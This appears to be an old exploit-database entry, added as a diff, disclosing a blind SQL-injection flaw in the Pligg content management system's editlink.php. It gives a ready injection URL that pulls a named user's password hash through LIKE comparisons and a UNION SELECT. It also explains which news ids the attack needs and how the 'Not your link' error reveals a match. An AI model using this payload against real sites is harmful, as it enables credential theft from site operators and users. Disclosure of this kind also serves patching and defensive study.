@@ -1,0 +1,18 @@
+Hello,
+
+the Pligg (http://www.pligg.com/) content management system is prone to 
+an SQL-injection vulnerability because it fails to sufficiently sanitize 
+user-supplied data before using it in an SQL query:
+
+
+editlink.php?id=1+AND+((SELECT+user_pass+FROM+pligg_users+WHERE+user_login=0x676f64)+LIKE+0x25)+UNION+SELECT+10,2
+
+To exploit this you need the id of a news you submitted(10 in the 
+example) and an id of a news submitted by others(1 in the example).
+
+When the LIKE statement matches you get a "Not your link" error.
+
+
+Guido Landi
+
+# milw0rm.com [2008-04-08]
